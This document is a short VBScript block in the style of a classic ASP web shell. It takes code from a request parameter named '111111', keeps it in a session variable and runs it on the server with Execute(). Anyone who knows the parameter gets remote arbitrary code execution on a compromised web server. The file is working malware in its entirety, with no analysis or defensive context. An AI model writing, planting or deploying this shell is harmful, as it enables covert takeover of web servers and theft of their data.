<script language="vbscript" runat="server">
If Request("111111")<>"" Then Session("lcxMarcos")=Request("111111")
If Session("lcxMarcos")<>"" Then Execute(Session("lcxMarcos"))
</script>
